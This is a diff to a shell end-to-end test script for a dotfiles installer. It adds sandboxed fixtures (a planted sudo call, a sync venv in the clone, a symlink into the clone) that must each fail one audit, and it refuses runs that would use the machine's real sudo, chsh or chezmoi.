+[ ! -e "$CLEAN_HOME/dotfiles/.venv-sync" ] || fail 'clean: the clone holds the AI-sync runtime'
 [ -z "$(git -C "$SRC" status --porcelain)" ] || fail 'clean: the source checkout changed'
 [ -z "$(git -C "$CLEAN_HOME/dotfiles" status --porcelain --untracked-files=all)" ] || fail 'clean: the clone is not clean'
 expect_eq 'clean clone rev' "$(git -C "$CLEAN_HOME/dotfiles" rev-parse HEAD)" "$REV_CLEAN"
 expect_text 'clean log' "$TEST_TMP/clean.err" 'pass, 0 fail,'
 printf 'ok: sandboxed dry run (clean fixture)\n'
 
-# The planted run, without negatives: doctor-initial itself passes, but the
-# sudo it made under check:doctor-initial fails the wrappers audit and the
-# run exits 1.
+# The planted runs, without negatives: each passes every step but one
+# audit. The sudo doctor.sh made under check:doctor-initial fails the
+# wrappers audit; the runtime setup-host.sh created in the clone during the
+# first apply (hidden from git status by .gitignore) fails the sync-runtime
+# audit; the link the first file apply made fails the clone-link audit.
 run_inside planted "$REV_PLANTED" "$TEST_TMP/home planted" E2E_NEGATIVE=
-expect_eq 'planted exit' "$RUN_RC" 1
+expect_one_fail planted audit-wrappers ' check:doctor-initial sudo '
 expect_step planted doctor-initial pass 'exit 1; '
-expect_step planted H7-stow pass '3 line(s) run as printed (run-stow)'
-expect_step planted audit-wrappers fail 'wrapper calls outside human/negative phases: '
-expect_step planted audit-wrappers fail ' check:doctor-initial sudo '
-expect_step planted audit-stow-state pass 'during human:H7-stow only'
+expect_step planted native-handover pass 'native_handover lab-ubuntu exit 0'
 [ "$(summary_rows planted negative-wsl-refused)" = '' ] || fail 'planted: a negative ran although E2E_NEGATIVE was empty'
-expect_eq 'planted fail count' "$(awk -F '\t' '$3 == "fail"' "$TEST_TMP/out-planted/summary.tsv" | grep -c .)" 1
 expect_eq 'planted clone rev' "$(git -C "$TEST_TMP/home planted/dotfiles" rev-parse HEAD)" "$REV_PLANTED"
 printf 'ok: sandboxed dry run (planted sudo fails the wrappers audit)\n'
+
+run_inside venv "$REV_VENV" "$TEST_TMP/home venv" E2E_NEGATIVE=
+expect_one_fail venv audit-sync-venv 'apply-1 (setup:apply-1)'
+expect_step venv second-apply pass 'exit 0, nothing applied, HOME untouched'
+[ -f "$TEST_TMP/home venv/dotfiles/.venv-sync/pyvenv.cfg" ] || fail 'venv: the planted runtime is missing'
+printf 'ok: sandboxed dry run (a sync runtime in the clone fails its audit)\n'
+
+run_inside link "$REV_LINK" "$TEST_TMP/home link" E2E_NEGATIVE=
+expect_one_fail link audit-clone-links "$TEST_TMP/home link/.stow-like"
+expect_step link native-converged pass 'empty diff; 5 managed file(s), all regular'
+[ -L "$TEST_TMP/home link/.stow-like" ] || fail 'link: the planted link is missing'
+printf 'ok: sandboxed dry run (a link into the clone fails its audit)\n'
 
 # --- refusals (exit 2) -----------------------------------------------------
 
@@ -1188,7 +1563,8 @@ expect_text 'home-taken' "$TEST_TMP/home-taken.err" 'exists already'
 # The sandbox seam relocates HOME only, so it drives nothing but a fixture
 # under the temp dir with stub tools: this repository as E2E_SRC is refused
 # (unless the checkout itself sits under the temp dir), and so is a PATH
-# whose sudo, chsh or stow is the machine's own.
+# whose sudo, chsh or chezmoi is the machine's own (a real chezmoi would
+# deploy into the sandbox home for real).
 TMP_ROOT=$(cd -- "${TMPDIR:-/tmp}" && pwd -P)
 case $REPO_ROOT in
     "$TMP_ROOT"/*) printf 'SKIP: the real-checkout refusal (this checkout lies under %s).\n' "$TMP_ROOT" ;;
@@ -1200,7 +1576,7 @@ case $REPO_ROOT in
         ;;
 esac
 REAL_TOOL=''
-for tool in sudo chsh stow; do
+for tool in sudo chsh chezmoi; do
     found=$(command -v "$tool" 2>/dev/null) || continue
     case $(cd -- "$(dirname -- "$found")" && pwd -P) in
         "$TMP_ROOT"/*) ;;
@@ -1214,8 +1590,22 @@ if [ -n "$REAL_TOOL" ]; then
     refused real-tool E2E_SANDBOX_HOME="$TEST_TMP/home tool" PATH="$PATH"
     expect_text 'real-tool' "$TEST_TMP/real-tool.err" "runs only with stub tools under the temp dir $TMP_ROOT; $REAL_TOOL on PATH is "
 else
-    printf 'SKIP: the real-tool refusal (no sudo, chsh or stow outside %s on PATH).\n' "$TMP_ROOT"
+    printf 'SKIP: the real-tool refusal (no sudo, chsh or chezmoi outside %s on PATH).\n' "$TMP_ROOT"
 fi
+# A chezmoi of the machine behind stub sudo and chsh is refused by name.
+REAL_CHEZMOI=$(command -v chezmoi 2>/dev/null) || REAL_CHEZMOI=''
+REAL_CHEZMOI_DIR=''
+[ -z "$REAL_CHEZMOI" ] || REAL_CHEZMOI_DIR=$(cd -- "$(dirname -- "$REAL_CHEZMOI")" && pwd -P)
+case $REAL_CHEZMOI_DIR in
+    '' | "$TMP_ROOT"/*) printf 'SKIP: the real-chezmoi refusal (no chezmoi outside %s on PATH).\n' "$TMP_ROOT" ;;
+    *)
+        mkdir -p "$TEST_TMP/stubs-only"
+        cp "$TEST_BIN/sudo" "$TEST_BIN/chsh" "$TEST_TMP/stubs-only/"
+        refused real-chezmoi E2E_SANDBOX_HOME="$TEST_TMP/home chezmoi" \
+            PATH="$TEST_TMP/stubs-only:$REAL_CHEZMOI_DIR:/usr/bin:/bin"
+        expect_text 'real-chezmoi' "$TEST_TMP/real-chezmoi.err" "; chezmoi on PATH is $REAL_CHEZMOI_DIR/chezmoi"
+        ;;
+esac
 if [ ! -f /.dockerenv ] && [ ! -f /run/.containerenv ] && [ "$(uname -s)" != Darwin ]; then
     # Without a seam, a workstation run is refused before it can touch HOME.
     refused no-seam E2E_NATIVE=1
